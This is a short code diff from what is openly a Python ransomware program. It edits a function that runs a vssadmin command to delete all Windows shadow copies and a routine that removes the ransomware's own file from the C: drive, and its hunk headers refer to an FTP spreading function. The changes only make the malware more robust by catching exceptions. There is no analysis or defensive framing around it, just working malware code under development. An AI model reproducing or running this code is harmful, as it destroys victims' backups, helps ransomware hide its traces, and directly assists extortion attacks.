@@ -181,7 +181,7 @@ def ftp_spread():
 
 def dlt_shadow_copy():
     try:
-        os.system('vssadmin delete shadows /all /quiet')
+        os.system('vssadmin Delete Shadows /All /Quiet')
     except Exception:
         pass
 
@@ -189,10 +189,13 @@ def dlt_shadow_copy():
 def delete_ransomware():
     path = 'C:\\'
     ransomware = sys.argv[0]
-    for r, d, files in os.walk(path):
-        for file in files:
-            if file.endswith(ransomware):
-                os.remove(file)
+    try:
+        for r, d, files in os.walk(path):
+            for file in files:
+                if file.endswith(ransomware):
+                    os.remove(file)
+    except Exception:
+        pass
 
 
 def main():
